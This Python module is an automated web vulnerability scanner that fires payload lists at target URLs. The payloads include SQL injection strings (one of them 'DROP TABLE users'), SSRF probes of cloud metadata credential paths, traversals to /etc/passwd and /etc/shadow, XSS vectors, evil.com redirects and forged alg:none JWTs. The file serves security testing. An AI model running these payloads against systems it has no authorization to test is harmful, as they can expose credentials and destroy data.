"""
modules/scanner.py — Vulnerability Scanner
Tests: SQLi, XSS, SSRF, LFI, Open Redirect, IDOR, JWT, CORS,
       Security Headers, S3 Misconfig, GraphQL introspection, API fuzzing
"""
import asyncio
import aiohttp
import json
import re
import base64
import hashlib
from urllib.parse import urlparse, urlencode, urljoin, parse_qs
from core.config import load_config, get_db
from core.logger import log

cfg = load_config()

# ── Payloads ───────────────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "1' AND SLEEP(5)--", "1; DROP TABLE users--",
    "' UNION SELECT NULL--", "') OR ('1'='1",
    "1 AND 1=2 UNION SELECT 1,2,3--",
]
SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ORA-", "syntax error",
    "unclosed quotation", "quoted string not properly terminated",
    "pg_query", "sqlite3", "you have an error in your sql",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "';alert(1)//",
    "<svg onload=alert(1)>",
    '"><img src=x onerror=confirm(1)>',
    "<body onload=alert`1`>",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/",
]
SSRF_INDICATORS = [
    "ami-id", "instance-id", "security-credentials",
    "root:x:", "daemon:", "computeMetadata",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "/etc/passwd",
    "../../../../etc/shadow",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
]
LFI_INDICATORS = ["root:x:", "daemon:", "[fonts]", "boot.ini", "www-data"]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%23",
    "https://evil.com%2F%2E%2E",
    "javascript:alert(1)",
]
REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnTo", "dest", "destination", "redir", "redirect_uri", "callback"]

CORS_ORIGINS = [
    "https://evil.com",
    "null",
    "https://attacker.com",
]

SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy",
]

GRAPHQL_INTROSPECTION = """{"query":"{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}"}"""
GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query"]


class VulnScanner:
    def __init__(self, target_id: int, domain: str):
        self.target_id = target_id
        self.domain    = domain
        self.findings  = []
        timeout = aiohttp.ClientTimeout(total=cfg["engine"]["request_timeout"])
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=aiohttp.TCPConnector(ssl=False, limit=30),
            headers={"User-Agent": cfg["engine"]["user_agents"][0]}
        )

    async def close(self):
        await self.session.close()

    def _add_finding(self, vuln_type, severity, title, description,
                     endpoint, parameter="", payload="", evidence="", cve=""):
        finding = {
            "vuln_type":   vuln_type,
            "severity":    severity,
            "title":       title,
            "description": description,
            "endpoint":    endpoint,
            "parameter":   parameter,
            "payload":     payload[:500] if payload else "",
            "evidence":    evidence[:1000] if evidence else "",
            "cve":         cve,
        }
        self.findings.append(finding)
        log.info(f"[SCANNER] [{severity.upper()}] {title} @ {endpoint}")

    # ── SQLi ──────────────────────────────────────────────────────────────────
    async def test_sqli(self, url: str, params: dict):
        if not cfg["scanner"]["sqli"]:
            return
        for param in params:
            for payload in SQLI_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    async with self.session.get(url, params=test_params) as resp:
                        body = (await resp.text(errors="ignore")).lower()
                        for error in SQLI_ERRORS:
                            if error.lower() in body:
                                self._add_finding(
                                    "sqli", "critical",
                                    f"SQL Injection in '{param}'",
                                    f"Parameter '{param}' is vulnerable to SQL injection. DB error triggered.",
                                    url, param, payload,
                                    evidence=f"Error string found: {error}"
                                )
                                return  # One finding per param is enough
                except:
                    pass
                await asyncio.sleep(cfg["engine"]["rate_limit_delay"])

    # ── XSS ──────────────────────────────────────────────────────────────────
    async def test_xss(self, url: str, params: dict):
        if not cfg["scanner"]["xss"]:
            return
        for param in params:
            for payload in XSS_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    async with self.session.get(url, params=test_params) as resp:
                        body = await resp.text(errors="ignore")
                        if payload in body:
                            self._add_finding(
                                "xss", "high",
                                f"Reflected XSS in '{param}'",
                                f"Payload reflected unescaped in response. Immediate code execution in victim browser.",
                                url, param, payload,
                                evidence=f"Payload found verbatim in response body"
                            )
                            return
                except:
                    pass
                await asyncio.sleep(cfg["engine"]["rate_limit_delay"])

    # ── SSRF ─────────────────────────────────────────────────────────────────
    async def test_ssrf(self, url: str, params: dict):
        if not cfg["scanner"]["ssrf"]:
            return
        ssrf_params = [p for p in params if any(k in p.lower() for k in
                       ["url", "link", "src", "source", "dest", "path", "host", "fetch", "load", "redirect"])]
        for param in ssrf_params:
            for payload in SSRF_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    async with self.session.get(url, params=test_params) as resp:
                        body = await resp.text(errors="ignore")
                        for indicator in SSRF_INDICATORS:
                            if indicator in body:
                                self._add_finding(
                                    "ssrf", "critical",
                                    f"SSRF via '{param}'",
                                    f"Server fetched internal resource. Metadata/internal service exposed.",
                                    url, param, payload,
                                    evidence=f"Indicator '{indicator}' in response"
                                )
                                return
                except:
                    pass

    # ── LFI ──────────────────────────────────────────────────────────────────
    async def test_lfi(self, url: str, params: dict):
        if not cfg["scanner"]["lfi"]:
            return
        lfi_params = [p for p in params if any(k in p.lower() for k in
                      ["file", "path", "page", "include", "load", "read", "doc", "view", "template"])]
        for param in lfi_params:
            for payload in LFI_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    async with self.session.get(url, params=test_params) as resp:
                        body = await resp.text(errors="ignore")
                        for indicator in LFI_INDICATORS:
                            if indicator in body:
                                self._add_finding(
                                    "lfi", "high",
                                    f"Local File Inclusion via '{param}'",
                                    "Server is reading local files. Can expose config files, source code, credentials.",
                                    url, param, payload,
                                    evidence=f"File content indicator '{indicator}' in response"
                                )
                                return
                except:
                    pass

    # ── Open Redirect ─────────────────────────────────────────────────────────
    async def test_open_redirect(self, url: str, params: dict):
        if not cfg["scanner"]["open_redirect"]:
            return
        redirect_params = [p for p in params if p.lower() in [r.lower() for r in REDIRECT_PARAMS]]
        for param in redirect_params:
            for payload in OPEN_REDIRECT_PAYLOADS:
                test_params = dict(params)
                test_params[param] = payload
                try:
                    async with self.session.get(url, params=test_params, allow_redirects=False) as resp:
                        location = resp.headers.get("Location", "")
                        if "evil.com" in location or payload in location:
                            self._add_finding(
                                "open_redirect", "medium",
                                f"Open Redirect via '{param}'",
                                "Application redirects to attacker-controlled URL. Usable in phishing chains.",
                                url, param, payload,
                                evidence=f"Location header: {location}"
                            )
                            return
                except:
                    pass

    # ── CORS Misconfiguration ─────────────────────────────────────────────────
    async def test_cors(self, url: str):
        if not cfg["scanner"]["cors"]:
            return
        for origin in CORS_ORIGINS:
            try:
                async with self.session.get(url, headers={"Origin": origin}) as resp:
                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                    if acao == origin or acao == "*":
                        severity = "high" if acac.lower() == "true" else "medium"
                        self._add_finding(
                            "cors", severity,
                            "CORS Misconfiguration",
                            f"Origin '{origin}' is reflected in ACAO header. "
                            + ("Credentials allowed — full session theft possible." if severity == "high" else ""),
                            url, evidence=f"ACAO: {acao}, ACAC: {acac}"
                        )
                        return
            except:
                pass

    # ── Security Headers ──────────────────────────────────────────────────────
    async def test_security_headers(self, url: str):
        if not cfg["scanner"]["security_headers"]:
            return
        try:
            async with self.session.get(url) as resp:
                missing = [h for h in SECURITY_HEADERS if h not in resp.headers]
                if missing:
                    self._add_finding(
                        "missing_headers", "low",
                        "Missing Security Headers",
                        f"Missing: {', '.join(missing)}",
                        url, evidence=str(dict(resp.headers))
                    )
        except:
            pass

    # ── JWT Vulnerabilities ───────────────────────────────────────────────────
    async def test_jwt(self, url: str, headers: dict):
        if not cfg["scanner"]["jwt_vulns"]:
            return
        auth_header = headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            return
        token = auth_header[7:]
        parts = token.split(".")
        if len(parts) != 3:
            return

        # Test 'alg: none'
        try:
            header_json = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            header_json["alg"] = "none"
            new_header = base64.urlsafe_b64encode(json.dumps(header_json).encode()).decode().rstrip("=")
            none_token = f"{new_header}.{parts[1]}."
            async with self.session.get(url, headers={"Authorization": f"Bearer {none_token}"}) as resp:
                if resp.status == 200:
                    self._add_finding(
                        "jwt_none_alg", "critical",
                        "JWT Algorithm None Accepted",
                        "Server accepts JWT with alg:none, allowing signature bypass. Full auth bypass possible.",
                        url, evidence="Status 200 with alg:none token"
                    )
        except:
            pass

    # ── S3 Bucket Misconfiguration ────────────────────────────────────────────
    async def test_s3(self, domain: str):
        if not cfg["scanner"]["s3_misconfig"]:
            return
        bucket_names = [
            domain, domain.replace(".", "-"),
            f"{domain}-backup", f"{domain}-dev", f"{domain}-static",
            f"{domain}-assets", f"{domain}-uploads",
        ]
        for bucket in bucket_names:
            url = f"https://{bucket}.s3.amazonaws.com/"
            try:
                async with self.session.get(url) as resp:
                    body = await resp.text(errors="ignore")
                    if resp.status == 200 and "ListBucketResult" in body:
                        self._add_finding(
                            "s3_misconfig", "high",
                            f"Public S3 Bucket: {bucket}",
                            "S3 bucket is publicly listable. May expose sensitive files, backups, credentials.",
                            url, evidence=f"Bucket listing visible: {body[:200]}"
                        )
                    elif resp.status == 403:
                        self._add_finding(
                            "s3_misconfig", "info",
                            f"S3 Bucket Exists (Access Denied): {bucket}",
                            "Bucket exists but is not public. Worth noting for further testing.",
                            url
                        )
            except:
                pass

    # ── GraphQL Introspection ─────────────────────────────────────────────────
    async def test_graphql(self, base_url: str):
        if not cfg["scanner"]["graphql"]:
            return
        parsed = urlparse(base_url)
        for path in GRAPHQL_PATHS:
            url = f"{parsed.scheme}://{parsed.netloc}{path}"
            try:
                async with self.session.post(
                    url,
                    json={"query": "{__schema{types{name}}}"},
                    headers={"Content-Type": "application/json"}
                ) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        if "__schema" in body or "__typename" in body:
                            self._add_finding(
                                "graphql_introspection", "medium",
                                "GraphQL Introspection Enabled",
                                "Full schema exposed via introspection. Attackers can map all queries/mutations.",
                                url, evidence=body[:300]
                            )
                            # Try batch query attack
                            await self._test_graphql_batch(url)
                            return
            except:
                pass

    async def _test_graphql_batch(self, url: str):
        try:
            batch = [{"query": "{__schema{types{name}}}"} for _ in range(100)]
            async with self.session.post(url, json=batch,
                                         headers={"Content-Type": "application/json"}) as resp:
                if resp.status == 200:
                    self._add_finding(
                        "graphql_batch", "medium",
                        "GraphQL Batching Enabled",
                        "Server accepts batched queries — can be used for brute-force bypassing rate limits.",
                        url
                    )
        except:
            pass

    # ── IDOR Detection ────────────────────────────────────────────────────────
    async def test_idor(self, url: str, params: dict):
        if not cfg["scanner"]["idor"]:
            return
        id_params = [p for p in params if any(k in p.lower() for k in ["id", "uid", "user", "account", "profile", "order"])]
        for param in id_params:
            original = params[param]
            try:
                # Try incrementing the ID
                test_id = str(int(str(original)) + 1) if str(original).isdigit() else "1"
                test_params = dict(params)
                test_params[param] = test_id
                async with self.session.get(url, params=test_params) as r1:
                    async with self.session.get(url, params=params) as r2:
                        body1 = await r1.text(errors="ignore")
                        body2 = await r2.text(errors="ignore")
                        # If responses differ and we got data (not error), potential IDOR
                        if r1.status == 200 and body1 != body2 and len(body1) > 50:
                            self._add_finding(
                                "idor", "high",
                                f"Potential IDOR via '{param}'",
                                "Different user data returned when ID was incremented. Manual verification required.",
                                url, param, test_id,
                                evidence=f"Status: {r1.status}, response length diff: {abs(len(body1)-len(body2))}"
                            )
            except:
                pass

    # ── Save findings ─────────────────────────────────────────────────────────
    async def save_findings(self, subdomain: str):
        db = await get_db()
        async with db:
            for f in self.findings:
                try:
                    await db.execute("""
                        INSERT OR IGNORE INTO findings
                        (target_id, subdomain, vuln_type, severity, title, description,
                         endpoint, parameter, payload, evidence, cve)
                        VALUES (?,?,?,?,?,?,?,?,?,?,?)
                    """, (
                        self.target_id, subdomain,
                        f["vuln_type"], f["severity"], f["title"], f["description"],
                        f["endpoint"], f["parameter"], f["payload"],
                        f["evidence"], f["cve"]
                    ))
                except Exception as e:
                    log.debug(f"[SCANNER] DB insert error: {e}")
            await db.commit()

    # ── Master scan ───────────────────────────────────────────────────────────
    async def scan_url(self, url: str, params: dict = None, headers: dict = None):
        params  = params or {}
        headers = headers or {}
        if not params:
            parsed = urlparse(url)
            if parsed.query:
                params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        await asyncio.gather(
            self.test_sqli(url, params),
            self.test_xss(url, params),
            self.test_ssrf(url, params),
            self.test_lfi(url, params),
            self.test_open_redirect(url, params),
            self.test_cors(url),
            self.test_security_headers(url),
            self.test_idor(url, params),
            self.test_graphql(url),
        )

    async def run(self, alive_hosts: list, endpoints: list) -> list:
        try:
            log.info(f"[SCANNER] Starting vuln scan on {len(alive_hosts)} hosts")

            # Scan base hosts
            for host in alive_hosts[:30]:
                url = host["url"]
                await self.scan_url(url)
                await self.test_s3(self.domain)
                subdomain = host.get("subdomain", self.domain)
                await self.save_findings(subdomain)

            # Scan discovered endpoints
            log.info(f"[SCANNER] Scanning {len(endpoints)} endpoints")
            for ep in endpoints[:200]:
                ep_url = ep.get("url", "")
                if not ep_url.startswith("http"):
                    continue
                await self.scan_url(ep_url)
                await asyncio.sleep(cfg["engine"]["rate_limit_delay"])

            await self.save_findings(self.domain)
            log.info(f"[SCANNER] Done. Found {len(self.findings)} vulnerabilities")
            return self.findings
        finally:
            await self.close()
